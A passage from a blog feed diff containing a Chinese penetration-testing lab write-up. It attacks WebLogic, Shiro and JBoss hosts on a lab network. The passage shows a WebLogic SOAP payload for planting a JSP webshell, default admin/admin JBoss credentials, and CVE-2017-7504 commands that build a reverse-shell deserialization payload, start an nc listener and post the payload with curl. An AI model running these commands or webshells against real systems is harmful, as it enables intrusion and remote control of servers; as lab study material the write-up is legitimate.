method=&quot;close&quot;/&gt;</span></span><br><span class="line"><span class="comment">                    &lt;/object&gt;</span></span><br><span class="line"><span class="comment">            &lt;/java&gt;</span></span><br><span class="line"><span class="comment">        &lt;/work:WorkContext&gt;</span></span><br><span class="line"><span class="comment">      &lt;/soapenv:Header&gt;</span></span><br><span class="line"><span class="comment">      &lt;soapenv:Body/&gt;</span></span><br><span class="line"><span class="comment">&lt;/soapenv:Envelope&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;% out.print(&quot;test&quot;); %&gt; 换成对应jsp🐎</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220103003302676.png" alt="image-20220103003302676"></p>
+<p><a href="http://172.16.20.62:7001/wls-wsat/1.jsp">http://172.16.20.62:7001/wls-wsat/1.jsp</a></p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220103003242901.png" alt="image-20220103003242901"></p>
+<p>哥斯拉链接</p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220103002839036.png" alt="image-20220103002839036"></p>
+<p>root用户，无其他网段</p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220103002921369.png" alt="image-20220103002921369"></p>
+<p>flag5  :flag{b717ca3e4543f05e6970ede833d68ba4}</p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220103003009202.png" alt="image-20220103003009202"></p>
+<h3 id="172-16-20-76-Shiro"><a href="#172-16-20-76-Shiro" class="headerlink" title="172.16.20.76 Shiro"></a>172.16.20.76 Shiro</h3><p>[*] WebTitle:<a href="http://172.16.20.76:8080/login;jsessionid=0DDFC6D0809CA87D818E92B67A8CFC33">http://172.16.20.76:8080/login;jsessionid=0DDFC6D0809CA87D818E92B67A8CFC33</a> code:200 len:10     title:Login Page</p>
+<p>确定为Shiro</p>
+<p>用工具<a href="https://github.com/j1anFen/shiro_attack/releases">https://github.com/j1anFen/shiro_attack/releases</a></p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220103021106383-16411470674991.png" alt="image-20220103021106383"></p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220103021136691.png" alt="image-20220103021136691"></p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220103021026217.png" alt="image-20220103021026217"></p>
+<h3 id="172-16-20-135-JBoss"><a href="#172-16-20-135-JBoss" class="headerlink" title="172.16.20.135 JBoss"></a>172.16.20.135 JBoss</h3><p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102231302358.png" alt="image-20220102231302358"></p>
+<ul>
+<li><p><a href="http://172.16.20.135:8080/web-console/">JBoss Web Console</a></p>
+<p>  admin  admin 进入</p>
+</li>
+</ul>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102230723865.png" alt="image-20220102230723865"></p>
+<p>确定版本可以使用CVE-2017-7504  [JBoss 4.x JBossMQ JMS 反序列化漏洞]([（CVE 2017 7504）JBoss 4.x JBossMQ JMS 反序列化漏洞 - Wiki (96.mk)](<a href="https://wiki.96.mk/Web%E5%AE%89%E5%85%A8/Jboss/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2017-7504%EF%BC%89JBoss">https://wiki.96.mk/Web安全/Jboss/反序列化漏洞/（CVE-2017-7504）JBoss</a> 4.x JBossMQ JMS 反序列化漏洞/))</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo git clone https:&#x2F;&#x2F;github.com&#x2F;ianxtianxt&#x2F;CVE-2015-7501.git</span><br><span class="line"></span><br><span class="line">javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java</span><br><span class="line">java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.1.192:4444（IP是攻击机ip,4444是要监听的端口)</span><br><span class="line"></span><br><span class="line">nc -lvnp 4444</span><br><span class="line">curl http:&#x2F;&#x2F;172.16.20.135:8080&#x2F;jbossmq-httpil&#x2F;HTTPServerILServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102233858765.png" alt="image-20220102233858765"></p>
+<p>root权限</p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102234228765.png" alt="image-20220102234228765"></p>
+<p>inet 10.2.5.62/20 brd 10.2.15.255 scope global eth1    发现10.2.5.*网段</p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102234258565.png" alt="image-20220102234258565"></p>
+<hr>
+<p>干不动了，二层三层内网后续更新，哎实际上就是代理+漏洞复现。</p>
+<p>感悟：第一是工具，第二是漏洞不是很敏感</p>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>漏洞利用</tag>
       </tags>
   </entry>
   <entry>
